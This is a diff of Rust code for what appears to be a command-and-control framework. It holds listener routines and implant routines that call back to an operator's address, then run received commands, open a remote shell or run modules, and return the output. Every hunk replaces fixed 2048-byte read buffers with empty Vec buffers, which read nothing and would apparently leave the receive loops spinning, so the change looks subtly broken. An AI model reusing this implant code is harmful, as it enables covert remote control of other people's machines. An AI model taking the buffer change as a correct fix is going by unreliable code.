@@ -108,7 +108,7 @@ fn listen_tcp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
         match acpt {
             // on a success, checks to see if "order up" was sent. if so, accept connection
             Ok((mut stream, _address)) => {
-                let mut buffer = [0; 2048];
+                let mut buffer = Vec::<u8>::new();
                 let bytes = stream.read(&mut buffer[..]).unwrap();
 
                 // replace insides of .contains() with whatever string/key we are using to verify connection
@@ -145,7 +145,7 @@ fn listen_udp(lsn: &mut Listener, address: SocketAddr, sb: &mut Arc<Mutex<Shared
         }
 
         // attempt to read from socket to verify a connection
-        let mut buffer = [0; 2048];
+        let mut buffer = Vec::<u8>::new();
         let (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut buffer) {
             Ok((b, s)) => (b, s),
             Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
@@ -199,7 +199,7 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                     // now send input from client to implant
                     lsn.udp_sock.as_ref().expect("udp socket not initialized").send_to(&sb_copy.buff, target);
                     // recieve output from implant
-                    let mut output = [0; 2048];
+                    let mut output = Vec::<u8>::new();
                     let (mut bytes, mut src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                         Ok((b, s)) => (b, s),
                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
@@ -212,7 +212,7 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                         };
                     }
                     // fill the shared buffer for the client to read from
-                    sb_copy.buff = output.to_vec();
+                    sb_copy.buff = output;
                     // set the memo
                     memo = String::from_utf8_lossy(&sb_copy.buff).to_string();
                 }
@@ -245,16 +245,16 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                             // loop until output is recieved from implant
                             let mut bytes = 0;
                             let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
-                            let mut output = [0; 2048];
+                            let mut output = Vec::<u8>::new();
                             while bytes == 0 {
-                                output = [0; 2048];
+                                output = Vec::<u8>::new();
                                 (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                                         Ok((b, s)) => (b, s),
                                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                                 };
                             }
                             // once output is recieved, fill the buffer for the client to read from
-                            sb_copy.buff = output.to_vec();
+                            sb_copy.buff = output;
                             flag = false;
                         }
                         else {
@@ -283,16 +283,16 @@ fn interact_udp(lsn: &mut Listener, target: SocketAddr, sb: &mut Arc<Mutex<Share
                             // loop until output is recieved
                             let mut bytes = 0;
                             let mut src = SocketAddr::from(([0, 0, 0, 0], 0));
-                            let mut output = [0; 2048];
+                            let mut output = Vec::<u8>::new();
                             while bytes == 0 {
-                                output = [0; 2048];
+                                output = Vec::<u8>::new();
                                 (bytes, src) = match lsn.udp_sock.as_ref().expect("udp socket not initialized").recv_from(&mut output) {
                                         Ok((b, s)) => (b, s),
                                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
                                 };
                             }
                             // once output recieved, fill buffer for client to read from
-                            sb_copy.buff = output.to_vec();
+                            sb_copy.buff = output;
                             flag = false;
                         }
                         else {
@@ -333,7 +333,7 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
                     stream.write(&[code; 1]).unwrap();
                     // now send input
                     stream.write(&sb_copy.buff).unwrap();
-                    let mut output = [0; 2048];
+                    let mut output = Vec::<u8>::new();
                     let mut bytes = match stream.read(&mut output) {
                         Ok(b) => b,
                         Err(e) => 0,
@@ -344,7 +344,7 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
                             Err(e) => 0,
                         };
                     }
-                    sb_copy.buff = output.to_vec();
+                    sb_copy.buff = output;
                     memo = String::from_utf8_lossy(&sb_copy.buff).to_string();
                 }
             }
@@ -370,15 +370,15 @@ fn interact_tcp(lsn: &mut Listener, stream: &mut TcpStream, sb: &mut Arc<Mutex<S
                             stream.write(&[code; 1]).unwrap();
                             stream.write(&sb_copy.buff).unwrap();
                             let mut bytes = 0;
-                            let mut output = [0; 2048];
+                            let mut output = Vec::<u8>::new();
                             while bytes == 0 {
-                                output = [0; 2048];
+                                output = Vec::<u8>::new();
                                 bytes = match stream.read(&mut output) {
                                         Ok(b) => b,
                                         Err(e) => 0,
                                 };
                             }
-                            sb_copy.buff = output.to_vec();
+                            sb_copy.buff = output;
                             flag = false;
                         }
                         else {
@@ -601,7 +601,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
 
     // try to connect back to listener
     sock.send_to("order up".as_bytes(), lsn_addr);
-    let mut buffer = [0; 2048];
+    let mut buffer = Vec::<u8>::new();
     let (mut bytes, mut src) = (0, SocketAddr::from(([0, 0, 0, 0], 0)));
     loop {
         (bytes, src) = match sock.recv_from(&mut buffer) {
@@ -626,7 +626,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
             match cc[0] {
                 // execute single line cmd
                 1 => {
-                    buffer = [0; 2048];
+                    buffer = Vec::<u8>::new();
                     let (bytes, src) = match sock.recv_from(&mut buffer) {
                         Ok((b, s)) => (b, s),
                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
@@ -640,7 +640,7 @@ fn imp_udp(lsn_addr: SocketAddr) {
                 2 => udp_shell(&mut sock),
                 // execute module
                 3 => {
-                    buffer = [0; 2048];
+                    buffer = Vec::<u8>::new();
                     let (bytes, src) = match sock.recv_from(&mut buffer) {
                         Ok((b, s)) => (b, s),
                         Err(e) => (0, SocketAddr::from(([0, 0, 0, 0], 0))),
@@ -670,7 +670,7 @@ fn imp_tcp(address: SocketAddr) {
     sock.set_read_timeout(Some(Duration::from_millis(1000))).expect("set_read_timeout failed");
     // try to connect back to listener
     sock.write("order up".as_bytes());
-    let mut buffer = [0; 2048];
+    let mut buffer = Vec::<u8>::new();
     let mut bytes = 0;
     loop {
         bytes = match sock.read(&mut buffer) {
@@ -695,7 +695,7 @@ fn imp_tcp(address: SocketAddr) {
             match cc[0] {
                 // execute single line cmd
                 1 => {
-                    buffer = [0; 2048];
+                    buffer = Vec::<u8>::new();
                     let bytes = match sock.read(&mut buffer) {
                         Ok(b) => b,
                         Err(e) => 0,
